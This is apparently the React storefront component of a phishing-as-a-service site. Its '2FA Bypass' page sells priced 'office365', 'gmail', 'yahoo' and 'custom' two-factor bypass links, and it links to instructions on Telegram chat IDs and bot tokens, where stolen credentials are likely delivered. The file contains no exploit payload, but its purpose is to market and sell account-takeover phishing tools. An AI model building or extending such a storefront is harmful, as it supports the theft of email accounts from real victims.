import React, { useEffect, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { getAccessToken } from "../constants";
import TabContainer from "./TabContainer";
import Twofactor from "../components/Twofactor";
import { email, gg, soft, yh } from "../assets";
import { useDispatch, useSelector } from "react-redux";
import { buyProduct, resetPlaceOrder } from "../features/orderSlice";

const myProducts = [
  {
    id: 0,
    title: "office365 2fa link",
    monthlyPrice: 400,
    dailyPrice: 300,
    img: soft,
  },
  {
    id: 1,
    title: "gmail 2fa link",
    monthlyPrice: 400,
    dailyPrice: 300,
    img: gg,
  },
  {
    id: 2,
    title: "yahoo 2fa link",
    monthlyPrice: 400,
    dailyPrice: 300,
    img: yh,
  },
  {
    id: 3,
    title: "custom 2fa link",
    monthlyPrice: 400,
    dailyPrice: 300,
    img: email,
  },
];

const Bypass = () => {
  const accessToken = getAccessToken();
  const dispatch = useDispatch();
  const navigate = useNavigate();

  const [success, setSuccess] = useState(false);
  const [error, setError] = useState(null);
  const [activeProductId, setActiveProductId] = useState(null);

  const { placeOrderError, placeOrderSuccess, placeOrderPending } = useSelector(
    (state) => state.order
  );

  const handleSubmit = (e, tool) => {
    e.preventDefault();
    setActiveProductId(tool.id);
    const data = {
      item: tool.title,
      price: tool.monthlyPrice,
    };

    dispatch(buyProduct(data));
  };

  const twoFaTools = myProducts.map((tool) => {
    const isActive = activeProductId === tool.id;
    return (
      <Twofactor
        key={tool.id}
        title={tool.title}
        monthlyPrice={tool.monthlyPrice}
        dailyPrice={tool.dailyPrice}
        img={tool.img}
        error={isActive ? error : null}
        success={isActive ? success : null}
        loading={isActive ? placeOrderPending : null}
        handleSubmit={(e) => handleSubmit(e, tool)}
      />
    );
  });

  useEffect(() => {
    if (placeOrderSuccess) {
      setSuccess(true);
    }
  }, [placeOrderSuccess]);

  useEffect(() => {
    if (placeOrderError) {
      setError(placeOrderError);
    }
  }, [placeOrderError]);

  useEffect(() => {
    let timeout;
    if (success) {
      timeout = 6000;
      setTimeout(() => {
        setSuccess(false);
        dispatch(resetPlaceOrder());
        navigate("/order");
      }, timeout);
    }
    return () => clearTimeout(timeout);
  }, [success, navigate, dispatch]);

  useEffect(() => {
    let timeout;
    if (error) {
      timeout = 6000;
      setTimeout(() => {
        setError(false);
        dispatch(resetPlaceOrder());
      }, timeout);
    }
    return () => clearTimeout(timeout);
  }, [error, dispatch]);

  useEffect(() => {
    if (!accessToken) {
      navigate("/signin");
    }
  }, [accessToken, navigate]);

  return (
    <TabContainer>
      <h3 className="text-xl lg:text-2xl font-semibold mt-5 capitalize">
        2FA Bypass
      </h3>
      <Link
        to={"https://telegra.ph/chatid-and-bot-token-08-28"}
        target="_blank"
        className="capitalize font-thin underline text-red-500"
      >
        more information
      </Link>
      <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-8">
        {twoFaTools}
      </div>
    </TabContainer>
  );
};

export default Bypass;
